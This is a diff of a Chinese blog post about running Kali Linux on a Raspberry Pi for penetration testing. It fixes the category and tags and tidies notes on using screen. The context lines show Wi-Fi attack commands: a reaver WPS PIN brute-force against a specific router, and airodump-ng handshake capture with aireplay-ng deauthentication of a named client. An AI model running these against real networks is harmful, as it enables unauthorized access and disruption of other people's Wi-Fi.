@@ -1,8 +1,8 @@
 ---
 layout: post
 title: 在树莓派上使用 Kali 进行"渗透测试"
-category: PHP
-tags: [命名空间, PHP]
+category: Linux
+tags: [Kali, 树莓派, 渗透测试]
 latest: 2015年12月4日 14:10:44
 ---
 
@@ -90,28 +90,26 @@ reaver -i mon0 -b F8:D1:11:31:50:24 -vv -c 6 -p 88948935
 sudo apt-get install rfkill
 ```
 
-
 - Failed to associate with … …
+
 - Request occur timeout … …
 
 ```
 airodump-ng -c 6 –w wpa-wps wlan0mon
 
 aireplay-ng -0 10 -a 50:BD:5F:0F:B9:BA -c BC:3A:EA:60:6C:61 wlan0mon
+```
 
 Screen 的使用
 -
 
 ```
-screen -S cracking
-
-screen -r cracking
+screen -S cracking    # 开启一个离线任务
+screen -r cracking    # 恢复一个离线任务
+exit                  # 退出 screen 会话
+screen -ls            # 查看所有 screen 会话
+screen -wipe          # 删除会话
 ```
-
-- `exit`             # 退出 screen 会话
-- `screen -ls`       # 查看所有 screen 会话
-- `screen -wipe`     # 删除会话
-
 参考
 -
 
